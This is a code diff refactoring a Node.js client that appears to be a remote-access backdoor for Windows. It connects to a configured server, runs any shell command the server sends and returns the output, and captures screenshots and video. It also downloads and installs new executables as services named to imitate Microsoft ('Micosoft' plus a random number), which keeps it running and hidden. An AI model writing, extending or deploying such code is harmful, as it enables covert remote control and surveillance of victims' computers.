@@ -1,27 +1,38 @@
 const fs = require("fs");
 const cmp = require("compressing");
-const {
-  SERVER_ADDRESS,
-  UPDATE_ADDRESS,
-  SERVER_PORT,
-  UPDATE_PORT,
-  RTMP_ADDRESS,
-  RTMP_PORT,
-} = require("../../my_config");
-const {
-  INSTALL_PATH,
-  BACKEND_NAME,
-  BACKEND_PATH,
-  NSSM_PATH,
-  UTILS_PATH,
-} = require("../../my_config");
-const { execSync, exec } = require("child_process");
+// const {
+//   gConfig.SERVER_ADDRESS,
+//   gConfig.UPDATE_ADDRESS,
+//   gConfig.SERVER_PORT,
+//   gConfig.UPDATE_PORT,
+//   RTMP_ADDRESS,
+//   RTMP_PORT,
+// } = require("../../my_config");
+// const {
+//   gConfig.INSTALL_PATH,
+//   BACKEND_NAME,
+//   BACKEND_PATH,
+//   NSSM_PATH,
+//   gConfig.UTILS_PATH,
+// } = require("../../my_config");
+
+// const {
+//   gStatus.isServiceStopped,
+//   gStatus.waitForServiceStatus,
+//   gStatus.isServiceExists,
+//   gStatus.STOPPED,
+// } = require("./status.js");
+const gConfig = require("../../my_config");
+const gStatus = require("./status");
+const cp = require("child_process");
 const os = require("os");
-var io = require("socket.io-client")(`${SERVER_ADDRESS}:${SERVER_PORT}`);
+var io = require("socket.io-client")(
+  `${gConfig.SERVER_ADDRESS}:${gConfig.SERVER_PORT}`
+);
 const ss = require("socket.io-stream");
 const icv = require("iconv-lite");
 const http = require("http");
-const { inspect } = require("util");
+const util = require("util");
 const path = require("path");
 
 function formatSeconds(value) {
@@ -59,127 +70,12 @@ function debug(msg) {
 }
 
 function details(error) {
-  return inspect(error, false, null, true);
-}
-
-function download(fileName) {
-  try {
-    if (!fs.existsSync("./tmpDir")) {
-      fs.mkdirSync("tmpDir");
-    }
-    const NEW_FILENAME = `${fileName}${new Date().getFullYear()}${
-      new Date().getMonth() + 1
-    }${new Date().getDate()}${new Date().getHours()}${new Date().getMinutes()}${new Date().getSeconds()}.exe`;
-
-    http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/pack.zip`, (res) => {
-      let ws = fs.createWriteStream("./tmpDir/pack.zip");
-      res.on("data", (chunk) => {
-        ws.write(chunk);
-      });
-      res.on("end", async () => {
-        ws.end();
-        debug(`工具集下载完毕`);
-        if (!fs.existsSync("./utils")) {
-          fs.mkdirSync(`${INSTALL_PATH}utils`);
-        }
-        try {
-          const result = await cmp.zip.uncompress(
-            "./tmpDir/pack.zip",
-            "./utils"
-          );
-        } catch (error) {
-          console.log(details(error));
-        }
-        http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/backend.zip`, (res) => {
-          let ws = fs.createWriteStream(`./tmpDir/backend.zip`);
-          res.on("data", (chunk) => {
-            ws.write(chunk);
-          });
-          res.on("end", async () => {
-            try {
-              ws.end();
-              debug("后端下载完毕");
-              ws.close();
-              ws = null;
-
-              try {
-                const result = await cmp.zip.uncompress(
-                  "./tmpDir/backend.zip",
-                  "./tmpDir"
-                );
-              } catch (error) {
-                console.log(details(error));
-              }
-
-              fs.renameSync(`./tmpDir/backend.exe`, `./${NEW_FILENAME}`);
-
-              // 更新文件校验
-              // try {
-              //   const crypto = require("crypto");
-              //   let hash = crypto.createHash("sha256");
-              //   let fileContent = fs.readFileSync(NEW_FILENAME);
-              //   hash.update(fileContent);
-              //   let newFileHash = hash.digest("hex");
-              //   http.get(`${UPDATE_ADDRESS}:${UPDATE_PORT}/hash.txt`, (res) => {
-              //     let raw = "";
-              //     res.on("data", (chunk) => {
-              //       raw += chunk;
-              //     });
-              //     res.on("end", () => {
-              //       if (raw === newFileHash) {
-              //         debug(`校验成功!\n${newFileHash}\n${raw}`);
-              //       } else {
-              //         debug(`校验失败!\n${newFileHash}\n${raw}`);
-              //       }
-              //     });
-              //   });
-              // } catch (e) {
-              //   debug(`校验过程错误\n${details(e)}`);
-              // }
-              const OLD_BACKEND_NAME = fs
-                .readFileSync(`${INSTALL_PATH}serviceName`)
-                .toString()
-                .split("%")[1];
-              const OLD_SERVICE_NAME = fs
-                .readFileSync(`${INSTALL_PATH}serviceName`)
-                .toString()
-                .split("%")[0];
-              const NEW_SERVICE_NAME = `Micosoft${Math.ceil(
-                Math.random() * 100000
-              )}`;
-              execSync(`nssm remove ${OLD_SERVICE_NAME} confirm`);
-              execSync(
-                `nssm install ${NEW_SERVICE_NAME} "${INSTALL_PATH}${NEW_FILENAME}"`
-              );
-              debug(`新服务名是${NEW_SERVICE_NAME},新后端名是${NEW_FILENAME}`);
-              fs.writeFileSync(
-                "fileToClean",
-                `${OLD_SERVICE_NAME}%${OLD_BACKEND_NAME}`
-              );
-              fs.writeFileSync(
-                "serviceName",
-                `${NEW_SERVICE_NAME}%${NEW_FILENAME}`
-              );
-              setTimeout(function () {
-                execSync(`nssm start ${NEW_SERVICE_NAME}`);
-              }, 1000);
-            } catch (e) {
-              debug(details(e));
-            }
-          });
-        });
-      });
-    });
-  } catch (e) {
-    // fs.writeFileSync("debug.txt", e);
-    debug("Download Wrong!!");
-    debug(details(e));
-  }
+  return util.inspect(error, false, null, true);
 }
 
 function myExec(data, emitCmdResult = true, callback = () => {}) {
   let result;
-  exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
+  cp.exec(data, { encoding: "binary" }, (error, stdout, stderr) => {
     console.log(stdout);
     try {
       if (error) throw error;
@@ -197,6 +93,326 @@ function myExec(data, emitCmdResult = true, callback = () => {}) {
   });
 }
 
+function clearTmpDir() {
+  let tmpDirFiles = fs.readdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
+  try {
+    for (const file of tmpDirFiles) {
+      fs.unlinkSync(`${gConfig.INSTALL_PATH}tmpDir/${file}`);
+    }
+  } catch (error) {
+    console.log("未完全清理");
+  }
+}
+
+function installNewService(bootstrapperName, backendName) {
+  const NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
+
+  if (backendName) {
+    cp.execSync(
+      `nssm install ${NEW_SERVICE_NAME} "${gConfig.INSTALL_PATH}${backendName}"`
+    );
+  } else if (bootstrapperName) {
+    cp.execSync(
+      `nssm install ${NEW_SERVICE_NAME} "${gConfig.INSTALL_PATH}${bootstrapperName}"`
+    );
+  }
+
+  debug(
+    `新服务名是${NEW_SERVICE_NAME},新启动器路径是${bootstrapperName},新后端路径是${backendName}`
+  );
+
+  //serviceName
+  if (backendName) {
+    return `${NEW_SERVICE_NAME}%${backendName}%${getOldBootstrapperName()}`;
+  } else {
+    return `${NEW_SERVICE_NAME}%${getOldBackendName()}%${bootstrapperName}`;
+  }
+}
+
+function createFileToClean(filePathArr) {
+  // for (const filePath of filePathArr) {
+  //   fs.unlinkSync(`${filePath}`);
+  // }
+
+  // const OLD_BACKEND_NAME = fs
+  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+  //   .toString()
+  //   .split("%")[1];
+  // const OLD_SERVICE_NAME = fs
+  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+  //   .toString()
+  //   .split("%")[0];
+  // fs.writeFileSync("fileToClean", `${OLD_SERVICE_NAME}%${OLD_BACKEND_NAME}`);
+  // fs.writeFileSync("serviceName", `${NEW_SERVICE_NAME}%${NEW_BACKEND_NAME}`);
+
+  // fs.writeFileSync(
+  //   `${gConfig.INSTALL_PATH}fileToCleanArr`,
+  //   JSON.stringify(filePathArr)
+  // );
+  fs.writeFileSync(
+    `${gConfig.INSTALL_PATH}fileToClean`,
+    `${getOldServiceName()}%${getOldBackendName()}%${getOldBootstrapperName()}`
+  );
+}
+
+function runFileToClean() {
+  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
+    const fileToClean = fs.readFileSync(`${gConfig.INSTALL_PATH}fileToClean`);
+    const arr = fileToClean.split("%");
+    if (arr[1]) {
+      fs.unlinkSync(`${gConfig.INSTALL_PATH}${arr[1]}`);
+    }
+    if (arr[2]) {
+      fs.unlinkSync(`${gConfig.INSTALL_PATH}${arr[2]}`);
+    }
+  }
+}
+
+function generateDateTail(fileName) {
+  let regResult;
+  let NEW_FILENAME;
+  if ((regResult = fileName.match(/(.*)\.(.*)/))) {
+    //有后缀名情况
+    NEW_FILENAME = `${regResult[1]}${new Date().getFullYear()}-${
+      new Date().getMonth() + 1
+    }-${new Date().getDate()}-${new Date().getHours()}-${new Date().getMinutes()}-${new Date().getSeconds()}.${
+      regResult[2]
+    }`;
+  } else {
+    //无后缀名默认为"exe"
+    NEW_FILENAME = `${fileName}${new Date().getFullYear()}-${
+      new Date().getMonth() + 1
+    }-${new Date().getDate()}-${new Date().getHours()}-${new Date().getMinutes()}-${new Date().getSeconds()}.exe
+    `;
+  }
+
+  return NEW_FILENAME;
+}
+
+function getOldBackendName() {
+  let OLD_BACKEND_NAME;
+  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
+    OLD_BACKEND_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
+      .toString()
+      .split("%")[1];
+  } else {
+    OLD_BACKEND_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+      .toString()
+      .split("%")[1];
+  }
+
+  return OLD_BACKEND_NAME;
+  // const OLD_SERVICE_NAME = fs
+  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+  //   .toString()
+  //   .split("%")[0];
+}
+
+function getOldServiceName() {
+  // const OLD_BACKEND_NAME = fs
+  //   .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+  //   .toString()
+  //   .split("%")[1];
+
+  let OLD_SERVICE_NAME;
+  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
+    OLD_SERVICE_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
+      .toString()
+      .split("%")[0];
+  } else {
+    OLD_SERVICE_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+      .toString()
+      .split("%")[0];
+  }
+
+  return OLD_SERVICE_NAME;
+}
+
+function getOldBootstrapperName() {
+  let OLD_BOOTRAPPER_NAME;
+  if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
+    OLD_BOOTRAPPER_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}fileToClean`)
+      .toString()
+      .split("%")[2];
+  } else {
+    OLD_BOOTRAPPER_NAME = fs
+      .readFileSync(`${gConfig.INSTALL_PATH}serviceName`)
+      .toString()
+      .split("%")[2];
+  }
+
+  return OLD_BOOTRAPPER_NAME;
+}
+
+function core_download(coreName = "backend.zip") {
+  try {
+    if (!fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir`)) {
+      fs.mkdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
+    }
+    http.get(
+      `${gConfig.UPDATE_ADDRESS}:${gConfig.UPDATE_PORT}/${coreName}`,
+      (res) => {
+        let ws = fs.createWriteStream(
+          `${gConfig.INSTALL_PATH}tmpDir/${coreName}`
+        );
+        res.on("data", (chunk) => {
+          ws.write(chunk);
+        });
+        res.on("end", async () => {
+          try {
+            ws.end();
+            debug("后端下载完毕");
+            ws.close();
+            ws = null;
+
+            let fileToClean = [];
+
+            //backend.zip 旧版兼容
+            try {
+              const result2 = cmp.zip
+                .uncompress(
+                  `${gConfig.INSTALL_PATH}tmpDir/${coreName}`,
+                  `${gConfig.INSTALL_PATH}tmpDir`
+                )
+                .then(async () => {
+                  debug("处理升级文件中...");
+
+                  let newObj = "";
+
+                  if (
+                    fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/backend.exe`)
+                  ) {
+                    let NEW_BACKEND_NAME = `${generateDateTail("backend.exe")}`;
+                    fs.renameSync(
+                      `${gConfig.INSTALL_PATH}tmpDir/backend.exe`,
+                      `${gConfig.INSTALL_PATH}${NEW_BACKEND_NAME}`
+                    );
+                    let old_backend_file_path = `${
+                      gConfig.INSTALL_PATH
+                    }${getOldBackendName()}`;
+                    fileToClean.push(getOldBackendName());
+                    newObj = installNewService(null, NEW_BACKEND_NAME);
+                  } else if (
+                    fs.existsSync(
+                      `${gConfig.INSTALL_PATH}tmpDir/bootstrapper.exe`
+                    )
+                  ) {
+                    const NEW_BOOTSTRAPPER_NAME = `${generateDateTail(
+                      "bootstrapper.exe"
+                    )}`;
+                    fs.renameSync(
+                      `${gConfig.INSTALL_PATH}tmpDir/bootstrapper.exe`,
+                      `${gConfig.INSTALL_PATH}${NEW_BOOTSTRAPPER_NAME}`
+                    );
+                    let old_service_file_path = `${
+                      gConfig.INSTALL_PATH
+                    }${getOldServiceName()}`;
+                    fileToClean.push(old_service_file_path);
+
+                    newObj = installNewService(NEW_BOOTSTRAPPER_NAME, null);
+                    if (
+                      fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/serviceCore`)
+                    ) {
+                      fs.renameSync(
+                        `${gConfig.INSTALL_PATH}tmpDir/serviceCore`,
+                        `${gConfig.INSTALL_PATH}serviceCore`
+                      );
+                      debug(`复制core完毕,带启动器`);
+                    }
+                  } else if (
+                    fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir/serviceCore`)
+                  ) {
+                    fs.renameSync(
+                      `${gConfig.INSTALL_PATH}tmpDir/serviceCore`,
+                      `${gConfig.INSTALL_PATH}serviceCore`
+                    );
+                    debug(`复制core完毕,不带启动器`);
+                    try {
+                      cp.execSync(
+                        `taskkill /F /im ${getOldBootstrapperName()}`
+                      );
+                    } catch (error) {
+                      debug(details(error));
+                    }
+                    return;
+                  }
+
+                  createFileToClean(fileToClean);
+                  fs.writeFileSync(
+                    `${gConfig.INSTALL_PATH}serviceName`,
+                    newObj
+                  );
+                  while (
+                    !gStatus.waitForServiceStatus(
+                      newObj.split("%")[0],
+                      gStatus.STOPPED
+                    )
+                  ) {
+                    await sleep(300);
+                  }
+                  cp.execSync(`nssm start ${newObj.split("%")[0]}`);
+                })
+                .catch((reason) => {
+                  debug(details(reason));
+                  debug("backend解压错误!");
+                });
+            } catch (error) {
+              console.log(details(error));
+            }
+          } catch (e) {
+            debug(details(e));
+          }
+        });
+      }
+    );
+  } catch (e) {
+    debug("Core Download Wrong!!");
+    debug(details(e));
+  }
+}
+
+function utils_download(utilsName = "pack.zip") {
+  if (!fs.existsSync(`${gConfig.INSTALL_PATH}tmpDir`)) {
+    fs.mkdirSync(`${gConfig.INSTALL_PATH}tmpDir`);
+  }
+  http.get(
+    `${gConfig.UPDATE_ADDRESS}:${gConfig.UPDATE_PORT}/${utilsName}`,
+    (res) => {
+      let ws = fs.createWriteStream(
+        `${gConfig.INSTALL_PATH}tmpDir/${utilsName}`
+      );
+      res.on("data", (chunk) => {
+        ws.write(chunk);
+      });
+      res.on("end", () => {
+        ws.end();
+        ws.end();
+        debug(`工具集下载完毕`);
+        if (!fs.existsSync(`${gConfig.INSTALL_PATH}utils`)) {
+          fs.mkdirSync(`${gConfig.INSTALL_PATH}utils`);
+        }
+        try {
+          const result = cmp.zip.uncompress(
+            `${gConfig.INSTALL_PATH}tmpDir/${utilsName}`,
+            `${gConfig.INSTALL_PATH}utils`
+          );
+        } catch (error) {
+          console.log(details(error));
+        }
+      });
+    }
+  );
+}
+
+io.on("reload", (id) => {
+  io.close();
+});
+
 io.on("connect_error", () => {
   console.log(`${new Date().toUTCString()}: connect error!`);
 });
@@ -204,20 +420,22 @@ io.on("connect_error", () => {
 io.on("connect", (sk) => {
   io.send(`from client ${io.id}`);
   io.emit("init", {
-    主机名: inspect(os.hostname()),
-    架构: inspect(os.arch()),
-    平台: inspect(os.platform()),
-    // networkInterfaces: inspect(os.networkInterfaces()),
-    // cpus: inspect(os.cpus()),
-    // tmpdir: inspect(os.tmpdir()),
-    空闲内存: inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
-    // userInfo: inspect(os.userInfo()),
-    总内存: inspect((os.totalmem() / 1024 / 1024 / 1000).toFixed(2) + "GB"),
+    主机名: util.inspect(os.hostname()),
+    架构: util.inspect(os.arch()),
+    平台: util.inspect(os.platform()),
+    // networkInterfaces: util.inspect(os.networkInterfaces()),
+    // cpus: util.inspect(os.cpus()),
+    // tmpdir: util.inspect(os.tmpdir()),
+    空闲内存: util.inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
+    // userInfo: util.inspect(os.userInfo()),
+    总内存: util.inspect(
+      (os.totalmem() / 1024 / 1024 / 1000).toFixed(2) + "GB"
+    ),
     //系统版本
-    系统版本名: inspect(os.version()),
-    // homedir: inspect(os.homedir()),
-    系统种类: inspect(os.type()),
-    系统正常运行时间: inspect(os.uptime() + "秒"),
+    系统版本名: util.inspect(os.version()),
+    // homedir: util.inspect(os.homedir()),
+    系统种类: util.inspect(os.type()),
+    系统正常运行时间: util.inspect(os.uptime() + "秒"),
   });
 });
 
@@ -228,24 +446,28 @@ io.on("message", (data) => {
 io.on("exec", (data) => {
   console.log(data);
   // let res = "empty";
-  // result = execSync(data);
-  // result = icv.decode(execSync(data), "gb2312");
+  // result = cp.execSync(data);
+  // result = icv.decode(cp.execSync(data), "gb2312");
   myExec(data);
   // console.log(result.toString());
   // io.emit("cmdresult", result.toString());
 });
 
-io.on("version_update", (fileName) => {
-  download(fileName);
+io.on("version_update", (coreName) => {
+  core_download(coreName);
+});
+
+io.on("utils_update", (utilsName) => {
+  utils_download(utilsName);
 });
 
 io.on("screenshot", async () => {
   try {
-    execSync(`${UTILS_PATH}ExplorerUtil.exe /screenshot`);
+    cp.execSync(`${gConfig.UTILS_PATH}ExplorerUtil.exe /screenshot`);
     await sleep(1000);
-    let buffer = fs.readFileSync(`${INSTALL_PATH}demo.jpg`);
+    let buffer = fs.readFileSync(`${gConfig.INSTALL_PATH}demo.jpg`);
     io.emit("screenshot", buffer.toString("base64"));
-    fs.unlinkSync(`${INSTALL_PATH}demo.jpg`);
+    fs.unlinkSync(`${gConfig.INSTALL_PATH}demo.jpg`);
   } catch (e) {
     debug(details(e));
   }
@@ -298,10 +520,10 @@ io.on("showfilecontent", () => {});
 
 io.on("startvideocapture", () => {
   try {
-    execSync(`tasklist|findstr "ffmpeg"`);
+    cp.execSync(`tasklist|findstr "ffmpeg"`);
   } catch (error) {
-    exec(
-      `${UTILS_PATH}ExplorerUtil.exe /videocapture`,
+    cp.exec(
+      `${gConfig.UTILS_PATH}ExplorerUtil.exe /videocapture`,
       (error, stdout, stderr) => {}
     );
     // io.emit("startvideocapture");
@@ -310,8 +532,8 @@ io.on("startvideocapture", () => {
 
 io.on("stopvideocapture", () => {
   try {
-    // execSync(`taskkill /F /im ExplorerUtil.exe`);
-    // execSync(`taskkill /F /im ffmpeg.exe`);
+    // cp.execSync(`taskkill /F /im ExplorerUtil.exe`);
+    // cp.execSync(`taskkill /F /im ffmpeg.exe`);
     myExec(`taskkill /F /im ExplorerUtil.exe`);
     myExec(`taskkill /F /im ffmpeg.exe`);
   } catch (error) {
@@ -331,29 +553,84 @@ io.on("dialog", () => {
   });
 });
 
-setTimeout(function () {
-  try {
-    if (!fs.existsSync("fileToClean")) {
-      return;
-    }
-    let fileToClean = fs.readFileSync("fileToClean").toString().split("%")[1];
-    let serviceToStop = fs.readFileSync("fileToClean").toString().split("%")[0];
-    // debug(fileToClean);
-    // debug(serviceToStop);
-    execSync(`nssm stop ${serviceToStop}`);
-    fs.unlinkSync(fileToClean);
-    fs.unlinkSync("fileToClean");
-    debug(`客户端更新完毕`);
-  } catch (e) {
-    console.log("无需更新或错误");
-    debug(details(e));
-    console.log(e);
-  }
-}, 500);
+function main() {
+  setTimeout(async function () {
+    try {
+      let oldBackend;
+      let serviceToStop;
+      let oldBootstrapper;
+      if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToClean`)) {
+        oldBackend = getOldBackendName();
+        oldBootstrapper = getOldBootstrapperName();
+        serviceToStop = getOldServiceName();
+        if (gStatus.isServiceExists(serviceToStop)) {
+          try {
+            cp.execSync(`nssm stop ${serviceToStop}`);
+            cp.execSync(`nssm remove ${serviceToStop} confirm`);
+          } catch (error) {
+            null;
+          }
+          // await gStatus.waitForServiceStatus(serviceToStop, gStatus.STOPPED);
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBackend}`)) {
+          fs.unlinkSync(oldBackend);
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBootstrapper}`)) {
+          fs.unlinkSync(oldBootstrapper);
+        }
+        if (fs.existsSync("fileToClean")) {
+          fs.unlinkSync("fileToClean");
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
+          fs.unlinkSync(`${gConfig.INSTALL_PATH}fileToCleanArr`);
+        }
+        clearTmpDir();
+      } else if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
+        oldBackend = getOldBackendName();
+        serviceToStop = getOldServiceName();
+        oldBootstrapper = getOldBootstrapperName();
+        if (gStatus.isServiceExists(serviceToStop)) {
+          try {
+            cp.execSync(`nssm stop ${serviceToStop}`);
+            cp.execSync(`nssm remove ${serviceToStop} confirm`);
+          } catch (error) {
+            null;
+          }
+          // await gStatus.waitForServiceStatus(serviceToStop, gStatus.STOPPED);
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBackend}`)) {
+          fs.unlinkSync(oldBackend);
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}${oldBootstrapper}`)) {
+          fs.unlinkSync(oldBootstrapper);
+        }
+        if (fs.existsSync("fileToClean")) {
+          fs.unlinkSync("fileToClean");
+        }
+        if (fs.existsSync(`${gConfig.INSTALL_PATH}fileToCleanArr`)) {
+          fs.unlinkSync(`${gConfig.INSTALL_PATH}fileToCleanArr`);
+        }
+        clearTmpDir();
+      } else {
+        console.log("无需清理");
+        return;
+      }
 
-setInterval(() => {
-  io.emit("updateinfo", {
-    系统正常运行时间: inspect(formatSeconds(os.uptime())),
-    空闲内存: inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
-  });
-}, 1000);
+      debug(`客户端更新完毕`);
+    } catch (e) {
+      console.log("无需更新或错误");
+      debug(details(e));
+      console.log(e);
+    }
+  }, 500);
+  setInterval(() => {
+    io.emit("updateinfo", {
+      系统正常运行时间: util.inspect(formatSeconds(os.uptime())),
+      空闲内存: util.inspect((os.freemem() / 1024 / 1024).toFixed(2) + "MB"),
+    });
+  }, 1000);
+}
+
+main();
+
+module.exports = main;
